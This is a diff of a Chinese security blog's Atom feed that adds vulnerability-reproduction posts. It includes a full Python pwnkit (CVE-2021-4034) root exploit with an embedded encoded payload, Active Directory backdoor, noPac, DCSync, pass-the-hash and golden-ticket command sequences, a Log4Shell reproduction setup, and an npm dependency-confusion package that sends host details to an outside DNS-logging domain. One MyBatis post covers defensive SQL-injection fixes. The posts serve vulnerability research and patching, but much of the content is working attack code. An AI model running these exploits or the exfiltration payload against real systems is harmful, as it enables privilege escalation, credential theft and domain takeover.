@@ -1,13 +1,750 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
-    <title>Gridea</title>
-    <updated>2021-12-28T11:53:14.879Z</updated>
+    <title>老白</title>
+    <updated>2022-02-04T12:25:25.217Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
-    <subtitle>温故而知新</subtitle>
     <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
     <icon>https://V-alkoinen.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2021, Gridea</rights>
+    <rights>All rights reserved 2022, 老白</rights>
+    <entry>
+        <title type="html"><![CDATA[CVE-2021-4034 Polkit local privilege escalation]]></title>
+        <id>https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/</id>
+        <link href="https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/">
+        </link>
+        <updated>2022-01-26T10:42:05.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-漏洞描述">一、漏洞描述</h1>
+<p>  <code>Qualys</code> 研究团队在 <code>polkit</code> 的 <code>pkexec</code> 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。</p>
+<h1 id="二-漏洞影响">二、漏洞影响</h1>
+<p> CentOS 6：polkit-0.96-11.el6_10.2<br>
+ CentOS 7：polkit-0.112-26.el7_9.1<br>
+ CentOS 8.0：polkit-0.115-13.el8_5.1<br>
+ CentOS 8.2：polkit-0.115-11.el8_2.2<br>
+ CentOS 8.4：polkit-0.115-11.el8_4.2</p>
+<p> Ubuntu 21.10 (Impish Indri) &lt; Released (0.105-31ubuntu0.1)<br>
+ Ubuntu 21.04 (Hirsute Hippo) Ignored (reached end-of-life)<br>
+ Ubuntu 20.04 LTS (Focal Fossa) &lt; Released (0.105-26ubuntu1.2)<br>
+ Ubuntu 18.04 LTS (Bionic Beaver) &lt; Released (0.105-20ubuntu0.18.04.6)<br>
+ Ubuntu 16.04 ESM (Xenial Xerus) &lt; Released (0.105-14.1ubuntu0.5+esm1)<br>
+ Ubuntu 14.04 ESM (Trusty Tahr) &lt; Released (0.105-4ubuntu3.14.04.6+esm1)</p>
+<h1 id="三-漏洞复现">三、漏洞复现</h1>
+<p> <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)</a></p>
+<p> 1、确认polkit版本</p>
+<pre><code>pkexec --version
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1643194850256.png" alt="" loading="lazy"><br>
+ 2、创建低权限用户</p>
+<pre><code>useradd laobai -p 123
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1643194431379.png" alt="" loading="lazy"><br>
+ 3、使用<a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">python exp</a></p>
+<pre><code>python3 exp.py
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1643194520673.png" alt="" loading="lazy"></figure>
+<pre><code># https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py
+#!/usr/bin/env python3
+
+# poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys
+# hardcoded amd64 lib
+from ctypes import *
+from ctypes.util import find_library
+import os
+import zlib
+import base64
+import tempfile
+
+payload = zlib.decompress(
+    base64.b64decode(
+        &quot;&quot;&quot;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&quot;&quot;&quot;
+    )
+)
+libc = CDLL(find_library(&quot;c&quot;))
+libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
+libc.execve.restype = c_ssize_t
+
+wd = tempfile.mkdtemp()
+open(wd + &quot;/pwn.so&quot;, &quot;wb&quot;).write(payload)
+os.mkdir(wd + &quot;/gconv/&quot;)
+open(wd + &quot;/gconv/gconv-modules&quot;, &quot;w&quot;).write(
+    &quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;
+)
+os.mkdir(wd + &quot;/GCONV_PATH=.&quot;)
+os.mknod(wd + &quot;/GCONV_PATH=./gconv&quot;)
+os.chmod(wd + &quot;/GCONV_PATH=.&quot;, 0o777)
+os.chmod(wd + &quot;/GCONV_PATH=./gconv&quot;, 0o777)
+os.chmod(wd + &quot;/pwn.so&quot;, 0o777)
+os.chdir(wd)
+cmd = b&quot;/usr/bin/pkexec&quot;
+argv = []
+envp = [
+    b&quot;gconv&quot;,
+    b&quot;PATH=GCONV_PATH=.&quot;,
+    b&quot;LC_MESSAGES=en_US.UTF-8&quot;,
+    b&quot;XAUTHORITY=../gconv&quot;,
+    b&quot;&quot;,
+]
+
+cargv = (c_char_p * (len(argv) + 1))(*argv, None)
+cenv = (c_char_p * (len(envp) + 1))(*envp, None)
+libc.execve(cmd, cargv, cenv)
+</code></pre>
+<p> 4、使用<a href="https://github.com/berdav/CVE-2021-4034">C exp</a></p>
+<pre><code>git clone https://github.com/berdav/CVE-2021-4034
+cd CVE-2021-4034/
+make
+./cve-2021-4034
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1643194684237.png" alt="" loading="lazy"></figure>
+<h1 id="四-修复方案">四、修复方案</h1>
+<p> 升级polkit<br>
+ Centos：</p>
+<pre><code>yum clean all &amp;&amp; yum makecache
+yum update polkit -y
+</code></pre>
+<p> Ubuntu：</p>
+<pre><code>sudo apt-get update
+sudo apt-get install policykit-1
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[userAccountControl权限维持]]></title>
+        <id>https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/</id>
+        <link href="https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/">
+        </link>
+        <updated>2022-01-14T08:50:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-漏洞详情">一、漏洞详情</h1>
+<p> ·1、<a href="https://twitter.com/kaidja/status/1480212323818217479">Create a fake computer account and change the UserAccountControl value to 8192. Now the AD thinks it is a domain controller.</a><br>
+ ·2、<a href="https://stealthbits.com/blog/server-untrust-account/">Active Directory persistence through userAccountControl manipulation</a><br>
+ ·3、<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">Use the UserAccountControl flags to manipulate user account properties</a><br>
+ 概要：该漏洞主要用于权限维持，当攻击者拿下域控后，可以创建一个机器账户，并通过特殊手段，将该账户提权至域控，此时机器账户可以作为后门使用。</p>
+<h1 id="二-漏洞用法">二、漏洞用法</h1>
+<pre><code>#创建机器账户
+New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Heo!&quot; -Force -AsPlainText)
+
+#修改userAccountControl
+Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}
+
+#验证是否被识别为域控
+Get-ADGroupMember -Identity &quot;Domain Controllers&quot; 
+或
+net group &quot;domain controllers&quot; /domain
+
+#以机器账户打开cmd
+runas /user:&lt;domian&gt;\SecTest2$ /netonly cmd
+
+#Run the Dcsync command 
+lsadump::dcsync /user:krbtgt
+</code></pre>
+<h1 id="三-漏洞复现过程">三、漏洞复现过程</h1>
+<p> 1、攻击前仅有一个域控<br>
+<code>net group &quot;domain controllers&quot; /domain</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642847423381.png" alt="" loading="lazy"><br>
+ 2、此时，假设我们通过hash传递获取了一个拥有域管权限的shell<br>
+<img src="https://V-alkoinen.github.io/post-images/1642847518854.png" alt="" loading="lazy"><br>
+ 执行下面命令</p>
+<pre><code>#创建机器账户
+wmic /node:'ad-m' process call create &quot;cmd /c powershell New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Hello1234!&quot; -Force AsPlainText)&quot;
+
+#修改userAccountControl
+wmic /node:'ad-m' process call create &quot;cmd /c powershell Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}&quot;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1642847721345.png" alt="" loading="lazy"><br>
+ 3、查看域控，发现已有两个域管<br>
+<code>net group &quot;domain controllers&quot; /domain</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642847761163.png" alt="" loading="lazy"><br>
+ 4、后续即使修改域管密码，我们依然可以通过我们创建的机器账户回复域管权限（可以使用mimikatz同步哈希）<br>
+<code>runas /user:&lt;domain&gt;\SecTest2$ /netonly cmd1</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642847979300.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[MyBatis框架SQL Injection解决方案]]></title>
+        <id>https://V-alkoinen.github.io/post/mybatis-kuang-jia-sql-injection-jie-jue-fang-an/</id>
+        <link href="https://V-alkoinen.github.io/post/mybatis-kuang-jia-sql-injection-jie-jue-fang-an/">
+        </link>
+        <updated>2022-01-05T11:02:26.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="mybatis">MyBatis</h1>
+<p>  <code>MyBatis</code>是一款在国内外使用度非常高的<code>ORM框架</code>。大致结构如下：<br>
+  1、加载配置：配置来源于两个地方，一处是配置文件，一处是 Java 代码的注解，将 SQL 的配置信息加载成为一个个<code>MappedStatement</code>对象（包括了传入参数映射配置、执行的 SQL 语句、结果映射配置），存储在内存中。<br>
+  2、SQL 解析：当 API 接口层接收到调用请求时，会接收到传入 SQL 的 ID 和传入对象（可以是Map、JavaBean或者基本数据类型），Mybatis会根据SQL的ID找到对应的<code>MappedStatement</code>，然后根据传入参数对象对<code>MappedStatement</code>进行解析，解析后可以得到最终要执行的SQL语句和参数。<br>
+  3、SQL执行：将最终得到的 SQL 和参数拿到数据库进行执行，得到操作数据库的结果。<br>
+  4、结果映射：将操作数据库的结果按照映射的配置进行转换，可以转换成<code>HashMap</code>、<br>
+<code>JavaBean</code>或者基本数据类型，并将最终结果返回。<br>
+<img src="https://V-alkoinen.github.io/post-images/1643523809306.png" alt="" loading="lazy"></p>
+<h1 id="mybatis动态传递参数方式">MyBatis动态传递参数方式</h1>
+<p>  <code>MyBatis</code>在传递参数时有两种方式：<br>
+  1、JDBC预编译模式：<code>#{param}</code><br>
+  2、SQL拼接模式：<code>${param}</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1643526965900.png" alt="" loading="lazy"></p>
+<h1 id="mybatis-sql-injection">MyBatis SQL Injection</h1>
+<p>  总所周知，SQL 拼接会导致SQL Injection，但;<code>MyBatis</code>在<code>ORDER BY</code>，<code>GROUP BY</code>、表名、列名等地方是不能使用<code>#{param}</code>的方式进行预编译。<br>
+<img src="https://V-alkoinen.github.io/post-images/1643527838188.png" alt="" loading="lazy"><br>
+  <code>MBG(MyBatis Generator)</code> 生成<code>MyBatis Mapper</code>文件在默认情况下会直接使用<code>${param}</code>的方法对<code>ORDER BY</code>、<code>GROUP BY</code>的参数传参。<br>
+  <code>orderByClause</code>:<br>
+<img src="https://V-alkoinen.github.io/post-images/1643530232143.png" alt="" loading="lazy"><br>
+  <code>Example_Where_Clause</code>:<br>
+<img src="https://V-alkoinen.github.io/post-images/1643530346773.png" alt="" loading="lazy"><br>
+  <code>Update_By_Example_Where_Clause</code>:<br>
+<img src="https://V-alkoinen.github.io/post-images/1643530465430.png" alt="" loading="lazy"></p>
+<h1 id="mybatis-sql-injection解决方案">MyBatis SQL Injection解决方案</h1>
+<p>  1、能用<code>#{param}</code>处理的全部不允许使用<code>{$param}</code>;<br>
+  2、不能用<code>#{param}</code>处理全部在<code>controller</code>做映射;【每条业务线做法不一，无法检查】<br>
+  3、采用<code>MBG扩展机制</code>修改MBG生成的<code>XMLMapper</code>和<code>JavaMapper</code>，生成安全注解；参考：<a href="https://github.com/Venscor/mybatis-generator-nodollar">https://github.com/Venscor/mybatis-generator-nodollar</a>，要求研发同时引入<code>MBG</code>扩展。<br>
+<img src="https://V-alkoinen.github.io/post-images/1643532961163.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1643532911060.png" alt="" loading="lazy"><br>
+  引入<code>MBG扩展</code>后，<code>ORDER BY</code>的生成格式：<br>
+<img src="https://V-alkoinen.github.io/post-images/1643533346659.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2021-44228 Apache Log4j2远程代码执行漏洞]]></title>
+        <id>https://V-alkoinen.github.io/post/cve-2021-44228-apache-log4j2-yuan-cheng-dai-ma-zhi-xing-lou-dong/</id>
+        <link href="https://V-alkoinen.github.io/post/cve-2021-44228-apache-log4j2-yuan-cheng-dai-ma-zhi-xing-lou-dong/">
+        </link>
+        <updated>2021-12-16T11:03:15.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-详情描述">一、详情描述</h1>
+<p>  2012年12月19日，<code>Log4j2</code> 中发现了一个 0-day 漏洞，通过记录某个字符串导致远程代码执行（RCE）。<br>
+  考虑到该组件的广泛性，漏洞利用的容易程度。我们简称它为 <code>Log4Shell</code>。<br>
+  0-day 和 <a href="https://github.com/tangxiaofeng7/apache-log4j-poc">github</a>上的 POC 一起在 <a href="https://web.archive.org/web/20211211082351/https://twitter.com/P0rZ9/status/1468949890571337731">twitter</a>发布 。</p>
+<h1 id="二-受影响应用">二、受影响应用</h1>
+<p>  <a href="https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592">受影响组织的响应列表</a><br>
+  已证明<a href="https://twitter.com/chvancooten/status/1469340927923826691">更改iphone名称即可触发Apple服务器中的漏洞</a></p>
+<h1 id="三-漏洞原理">三、漏洞原理</h1>
+<p> 1、Log4j 是一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等。<br>
+<img src="https://V-alkoinen.github.io/post-images/1642835981727.png" alt="" loading="lazy"><br>
+ 2、Log4j2 提供了<code>lookups</code>功能，用于向日志中打印 Log4j 配置的值，如：<code>hello ${java:os}</code>、<code>hello ${java:vm}</code>。当然，这也算不上什么，只能说是功能较为强大。<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">lookups说明</a><br>
+<img src="https://V-alkoinen.github.io/post-images/1642836822098.png" alt="" loading="lazy"><br>
+ 3、Log4j2还提供了<code>JNDI Lookup、RMI</code>远程调用，可以通过JNDI引入目录资源，进行加载class执行代码。也可以通过RMI远程调用资源。<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">JNDI调用方法</a></p>
+<h1 id="四-漏洞复现">四、漏洞复现</h1>
+<p> 1、新建一个 maven 项目，加入<code>Log4j 2.14.0</code>组件：</p>
+<pre><code>&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+        &lt;version&gt;2.14.0&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+        &lt;version&gt;2.14.0&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1642837513980.png" alt="" loading="lazy"><br>
+ 2、使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a>开启LDAP及HTTP服务。相关端口可修改 src/main/java/run/ServerStart.java 文件并重新编译。<br>
+<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1642839176072.png" alt="" loading="lazy"><br>
+ 3、使用Log4j 打印带有EXP的日志<br>
+因我本机JDK版本为 8u261，因此需要允许通过codebase加载任意远程类</p>
+<pre><code>import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class log4jtest {
+
+    public static void main(String[] args){
+
+        Logger logger = LogManager.getLogger(log4jtest.class);
+
+        //String content = &quot;laobai&quot;;
+        //logger.error(&quot;hello ${java:os}&quot;);
+        //logger.error(&quot;hello ${java:vm}&quot;);
+
+        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);
+        logger.error(&quot;&lt;EXP&gt;&quot;);
+        
+    }
+}
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1642839108215.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1642839542272.png" alt="" loading="lazy"></p>
+<h1 id="五-修复方案">五、修复方案</h1>
+<p> 1、升级Apache Log4j2所有相关应用到最新版；<br>
+ 2、升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2021-42287/CVE-2021-42278 一键域控]]></title>
+        <id>https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/</id>
+        <link href="https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/">
+        </link>
+        <updated>2021-12-15T08:52:02.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-前言">一、前言</h1>
+<p>  最近域爆出了一个组合漏洞，利用条件低，基本可以一键域控，具体可以参考下面链接：<br>
+ · <a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">CVE-2021-42287/CVE-2021-42278 Weaponisation</a><br>
+ · <a href="https://mp.weixin.qq.com/s/8G4SDqe6dHqB3S47EHI7Gg">AD漏洞预警（严重）：任意域用户可获得域管理权限，极易引发勒索事件 </a><br>
+ · <a href="https://www.geekby.site/2021/12/samaccountname-spoofing/">sAMAccountName spoofing</a></p>
+<h1 id="二-漏洞原理">二、漏洞原理</h1>
+<p>  如果获得了 DC 用户的 TGT 票据且域内有一台域控名为 DC$，此时将 DC 用户删除，再用 DC 用户的 TGT 票据请求 S4U2self ，那么 DC 就可以获得域控账户（DC$）的 ST 票据。</p>
+<h1 id="三-利用方法">三、利用方法</h1>
+<p>  1、创建一个机器账户；<br>
+  2、将机器账户（sAMAccountName）改名为 DC（域内有一台域控名为 DC$）；<br>
+  3、申请 TGT；<br>
+  4、删除机器账户，或将机器账户（sAMAccountName）改名为其他；<br>
+  5、域控在 TGS_REQ 时就会找不到之前为 DC 的机器用户，此时域控会寻找 DC$ 用户，并使用 DC$ 的密钥加密票据，然后我们就可以得到一张高权限的ST。</p>
+<h1 id="四-利用条件">四、利用条件</h1>
+<p>  根据用法，可以得出该组合漏洞的利用条件：<br>
+  1、要能添加机器用户；<br>
+  2、有一个域内的普通用户；</p>
+<h1 id="五-实际利用过程">五、实际利用过程</h1>
+<h3 id="51-信息收集">5.1、信息收集</h3>
+<pre><code># 获取域控列表
+nltest /dclist:
+
+#获取域控名称
+net group &quot;domain controllers&quot; /domain
+
+#获取域内所有用户名称
+net user /domain
+
+#获取某一个用户的信息
+net user &lt;username&gt; /domain
+
+#查看域内组
+net group /domain
+
+#查看组内机器
+net group &quot;domain computers&quot; /domain
+</code></pre>
+<h3 id="52-实际利用过程">5.2、实际利用过程</h3>
+<p> 我们直接采用武器化工具<br>
+ EXP：<a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<pre><code>#cifs权限
+.\noPac.exe -domain &lt;domain_name&gt; -user &lt;domainuser_name&gt; -pass '&lt;domainuser_pass&gt;' /dc '&lt;DC&gt;'  /mAccount &lt;机器用户名称&gt; /mPassword &lt;机器用户密码&gt; /service cifs /ptt
+
+#ldap权限
+.\noPac.exe -domain &lt;domain_name&gt; -user &lt;domainuser_name&gt; -pass '&lt;domainuser_pass&gt;' /dc '&lt;DC&gt;'  /mAccount &lt;机器用户名称&gt; /mPassword &lt;机器用户密码&gt; /service ldap /ptt
+
+#klist
+查看缓存票据
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1642241081628.png" alt="" loading="lazy"></figure>
+<pre><code>mimikatz
+
+#开启debug模式
+privilege::debug
+
+#打开log
+log
+
+#同步域管哈希
+lsadump::dcsync /domain:&lt;domain_name&gt; /user:administrator
+#同步krbtgt
+lsadump::dcsync /domain:&lt;domain_name&gt; /user:krbtgt
+#同步全域哈希
+lsadump::dcsync /domain:&lt;domain_name&gt; /all /csv
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1642241940038.png" alt="" loading="lazy"><br>
+ 重新打开本地管理员shell</p>
+<pre><code>mimikatz
+
+privilege::debug
+
+#哈希传递
+sekurlsa::pth /domain:&lt;domian_name&gt; /user:administrator /ntlm:NTLM_HASH
+</code></pre>
+<p> 此时会有一个带有域管票据的shell，在这个shell即可执行命令</p>
+<pre><code>#查看进程
+wmic /node:ad-m process list brief
+
+#wmic执行代码
+wmic /node:ad-m process call create &quot;cmd /c whoami&gt;c:\secTest.txt&quot;
+
+#计划任务执行代码
+schtasks /create /s ad-m /tn &quot;test&quot; /st 00:00 /sc ONCE /tr &quot;cmd /c whoami&gt;c:\secTest.txt&quot; /RU System 
+schtasks /s pdc /run /tn &quot;test&quot; 
+schtasks /s pdc /delete /tn &quot;test&quot;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1642242373554.png" alt="" loading="lazy"><br>
+ 权限维持</p>
+<pre><code>#同步krbtgt hash
+mimikatz &quot;privilege::debug&quot; &quot;log&quot; &quot;lsadump::dcsync /user:krbtgt&quot; exit1
+
+#利用krbtgt hash注入黄金票据
+mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt&gt; /user:administrator /ticket:golden.kirbi /ptt&quot; exit
+</code></pre>
+<p> 权限维持完成</p>
+<h1 id="六-其他">六、其他</h1>
+<p> Kerberos协议详解：<a href="http://www.nosqlnotes.com/technotes/kerberos-protocol/">http://www.nosqlnotes.com/technotes/kerberos-protocol/</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Dependency Confusion]]></title>
+        <id>https://V-alkoinen.github.io/post/Dependency Confusion/</id>
+        <link href="https://V-alkoinen.github.io/post/Dependency Confusion/">
+        </link>
+        <updated>2021-10-03T05:52:47.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>  Dependency Confusion，一个让微软、苹果、PayPal、Shopify等公司给出3W美元赏金的漏洞</p>
+<h1 id="漏洞原理与分析">漏洞原理与分析</h1>
+<p>  我们常用Python、Ruby、Nodejs等编程语言构建项目，都会引用一些依赖包。如果应用的构建使用私有的、内部创建的依赖项，而该依赖项在公共开源存储库中不存在，那么就会发生Dependency Confusion。攻击者能够在公共存储库上以相同的名称注册具有更高版本号的依赖项。然后，最可能发生的是，应用在构建的时候会拉取攻击者在公共依赖库中上传的高版本依赖包，从而执行攻击者的代码。</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<h4 id="1-访问某站点时发现该站点引用了一部分-npm-包"> 1、访问某站点时发现该站点引用了一部分 npm 包；</h4>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1641207155562.png" alt="" loading="lazy"></figure>
+<h4 id="2-npmjs查找-npm-包并未发现确认为私有包"> 2、<a href="https://www.npmjs.com/">npmjs</a>查找 npm 包，并未发现，确认为私有包；</h4>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1642324613899.png" alt="" loading="lazy"></figure>
+<h4 id="3-注册包名并发布恶意代码以下代码仅作漏洞证明"> 3、注册包名，并发布恶意代码（以下代码仅作漏洞证明）</h4>
+<p> index.js</p>
+<pre><code>const { exec } = require(&quot;child_process&quot;);
+exec(&quot;pwd | xxd -p | while read ut;do dig $ut.xxx.ceye.io;done; b=$(hostname | head | xxd -p) &amp;&amp; nslookup $b.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; c=$(curl ifconfig.me | head | xxd -p) &amp;&amp; nslookup $c.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; d=$(echo shineout-mobile | head | xxd -p) &amp;&amp; nslookup $d.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1; e=$(whoami | head | xxd -p ) &amp;&amp; nslookup $a.xxx.ceye.io &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
+ if(error){
+  console.log(&quot;error&quot;,error.message);
+  return;
+ }
+ if(getter){
+  console.log(data);
+  return;
+ }
+ console.log(data);
+
+});
+</code></pre>
+<p> build.js</p>
+<pre><code>exec(&quot;node main.js  &gt; /dev/null 2&gt;&amp;1;&quot;, (error, data, getter) =&gt; {
+ if(error){
+  console.log(&quot;error&quot;,error.message);
+  return;
+ }
+ if(getter){
+  console.log(data);
+  return;
+ }
+ console.log(data);
+
+});
+</code></pre>
